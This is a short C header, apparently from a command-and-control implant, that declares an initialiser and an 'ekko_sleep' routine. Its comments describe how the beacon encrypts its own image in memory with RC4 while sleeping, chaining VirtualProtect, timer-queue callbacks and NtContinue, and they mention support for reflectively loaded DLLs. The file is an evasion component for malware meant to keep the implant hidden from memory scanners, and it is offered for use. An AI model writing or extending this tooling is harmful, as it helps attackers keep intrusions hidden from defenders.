#ifndef SLEEP_OBF_H
#define SLEEP_OBF_H

#include <windows.h>

/**
 * @brief Resolve NtContinue + SystemFunction032 and locate this module's
 *        base address / size. Call once at beacon startup. Safe to call in
 *        both EXE and DLL builds (including reflectively-loaded DLLs).
 * @return 0 on success, -1 if any resolution step failed.
 */
int sleep_obf_init(void);

/**
 * @brief Sleep for timeout_ms while the beacon image is encrypted in place.
 *
 *        Chains VirtualProtect(RW) -> RC4 encrypt -> WaitForSingleObject(sleep)
 *        -> RC4 decrypt -> VirtualProtect(RX) -> SetEvent via
 *        CreateTimerQueueTimer + NtContinue, so the beacon thread is genuinely
 *        blocked (not executing) while its .text/.rdata/.data are ciphertext.
 *
 *        Falls back to plain Sleep() if sleep_obf_init failed.
 *
 * @param timeout_ms Sleep duration in milliseconds.
 */
void ekko_sleep(DWORD timeout_ms);

#endif /* SLEEP_OBF_H */
